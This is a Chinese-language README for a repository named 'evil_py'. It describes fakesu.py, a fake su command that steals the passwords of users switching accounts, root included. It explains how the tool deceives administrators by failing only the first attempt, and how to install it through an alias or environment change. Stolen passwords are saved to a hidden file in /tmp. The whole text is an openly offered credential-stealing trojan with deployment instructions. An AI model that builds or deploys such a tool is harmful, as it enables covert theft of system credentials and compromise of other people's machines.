# evil_py [![Python 2.6|2.7](https://img.shields.io/badge/python-2.6|2.7-yellow.svg)](https://www.python.org/) [![License](https://img.shields.io/badge/license-Public_domain-red.svg)](https://wiki.creativecommons.org/wiki/Public_domain)
一些小玩意儿

## fakesu.py
### 说明
看过网上的一些类似脚本，不过都太粗暴，每次su切换时都提示密码错误，容易被发现。

故，自己重新造了一个，可模拟su切换用户，窃取任意用户的密码，第一会提示密码错误，管理员会以为输错了，再次输入密码时可通过正常的su切换用户，起到一定的迷惑性。

### 功能
* 可自动判断账号是否存在
* 可窃取任意通过su切换的账号密码，不限root
* 可模拟处理延迟、错误信息、键盘异常退出

### 用法
* 临时使用，可直接alias su='python fakesu.py路径'
* 永久使用，可更改系统环境配置
* 窃取的密码默认存放在/tmp/.passwords中
* 根据Debian系统错误提示做的，其他系统可自定义错误提示

### 已知不足
* 不能判断窃取的密码是否是正确的
* 每次su第一次输入的密码，不管正确与否都会提示错误，第二次登陆自动转换到真实su

